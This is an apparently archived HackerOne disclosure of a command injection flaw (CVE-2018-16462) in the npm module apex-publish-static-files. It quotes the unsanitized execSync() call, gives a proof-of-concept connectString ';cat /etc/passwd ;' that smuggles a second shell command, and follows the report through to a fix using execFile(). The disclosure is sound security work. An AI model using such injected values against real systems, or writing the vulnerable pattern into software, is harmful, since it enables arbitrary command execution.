---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/command-injection-generic
  - env/web
  - stack/node
substate: "resolved"
weakness: "Command Injection - Generic"
enriched: true
body: true
date: 2018-10-18
submitted: 2018-09-05T01:49:30.554Z
bounty_usd: null
votes: 10
cve: "CVE-2018-16462"
program: "[[programs/nodejs-ecosystem|Node.js third-party modules]]"
reporter: "abdilahrf_"
source: "https://hackerone.com/reports/405694"
title: "[apex-publish-static-files] Command Injection on connectString"
---
# [apex-publish-static-files] Command Injection on connectString

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 10 | **Program:** Node.js third-party modules | **Disclosed:** 2018-10-18

- Report: [https://hackerone.com/reports/405694](https://hackerone.com/reports/405694)
- CWE: Command Injection - Generic | CVE: CVE-2018-16462
- Submitted: 2018-09-05T01:49:30.554Z

## Report summary

vulnerable_versions <= 2.0.0
patched versions >= 2.0.1

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

I would like to report a command injection vulnerability in the apex-publish-static-files npm module.
It allows arbitrary shell command execution through a maliciously crafted argument.

# Module

**module name:** apex-publish-static-files
**version:** 2.0.0
**npm page:** `https://www.npmjs.com/package/apex-publish-static-files`

## Module Description

>Uploads all files from a local directory to Oracle APEX

## Module Stats

15 downloads in the last day
~170 downloads in the last month

# Vulnerability

## Vulnerability Description

apex-publish-static-files does not sanitize the connectionString argument, and subsequently passes it to execSync(), thus allowing arbitrary shell command injection. 

Vulnerability Code : [https://github.com/vincentmorneau/apex-publish-static-files/blob/master/index.js#54-66](https://github.com/vincentmorneau/apex-publish-static-files/blob/master/index.js#54-66)

```
			const childProcess = execSync(
				'"' + opts.sqlclPath + '"' + // Sqlcl path
				' ' + opts.connectString + // Connect string (user/pass@server:port/sid)
				' @"' + path.resolve(__dirname, 'lib/script') + '"' + // Sql to execute
				' "' + path.resolve(__dirname, 'lib/distUpload.js') + '"' + // Param &1 (js to execute)
				' "' + path.resolve(opts.directory) + '"' + // Param &2
				' ' + opts.appID + // Param &3
				' "' + opts.destination + '"' + // Param &4
				' "' + opts.pluginName + '"' // Param &5
				, {
					encoding: 'utf8'
				}
			);
```


## Steps To Reproduce:

- npm i apex-publish-static-files
- create index.js file like this :

```
var publisher = require('apex-publish-static-files');
 
publisher.publish({
connectString: ";cat /etc/passwd ;",
    directory: "public",
    appID: 111
});
```
- execute `node index.js`

F342500

## Supporting Material/References:

OS: WSL Ubuntu 16.04
NODE: v10.8.0
NPM : 6.2.0


# Wrap up

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

## Impact

It allows arbitrary shell command execution through a maliciously crafted argument.

## Timeline

- **Report Filed**
- **2018-09-05** @api_xmgchqhv69rw1zem6733xop0tz: Hello,
Thanks for reporting this to us. Someone will quickly look at this report and triage it.
- **2018-09-07** @lirantal: Thanks @abdilahrf_ 
I reached out to the maintainer to help triage this issue
- **Report Triaged**
- **2018-09-07** @abdilahrf_: thanks @lirantal for the update,
let me know if anything i can do to help
- **Report Severity Updated**
- **Changed Scope**
- **2018-10-12** @abdilahrf_: seems the author is not coming to this report, should we disclose this ?
- **2018-10-13** @lirantal: Due to inactivity from the maintainer I opened an issue in the repository: https://github.com/vincentmorneau/apex-publish-static-files/issues/12
- **External User Joined**
- **2018-10-16** @vincentmorneau: Thanks for bringing this to my attention. Before I investigate and find a solution, do you have any common insight for sanitizing argument "connectionString", subsequently passed to execSync()?
- **2018-10-16** @lirantal: Hi @vincentmorneau,
Thanks for joining!

Take a look at the docs in https://nodejs.org/api/child_process.html with regards to the difference between exec() and execFile(). execFile() is safer in terms of pinning your executable to a specific binary (which you may need to sanitize or make sure its a constant that you control and not the user), and then further arguments are provided as an array. The arguments may try to escape the shell but they won't due to the fact that they are handed over as extra params to the open process handler.

Hope this helps.
Maybe @abdilahrf_ would like to add more.
- **2018-10-17** @vincentmorneau: Is this any better? https://github.com/vincentmorneau/apex-publish-static-files/blob/master/index.js#L74
- **2018-10-18** @abdilahrf_: Hi @lirantal and @vincentmorneau 
Looks like that more better, i can't reproduce working poc again.

F362575
- **2018-10-18** @vincentmorneau: awesome. If you agree to close this ticket I'll publish a new release (2.0.1). Thanks so much for looking into this.
- **2018-10-18** @lirantal: Great, I'll go ahead and resolve this as a public disclosure and wait for you to release the new version.
Thank you @vincentmorneau for joining us and helping make the ecosystem more secure and @abdilahrf_ for your effort in helping us find and close security bugs!
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **2018-10-24** @vincentmorneau: FYI v2.0.1 has been published. Thanks again, much appreciated.
- **2018-10-24** @lirantal: Great thanks!
- **2026-08-28** @abdilahrf_: Hi, this report is currently in my pending bounty tabs. Could you please mark this report as ineligible for a bounty so that my pending bounty tabs can be cleared?
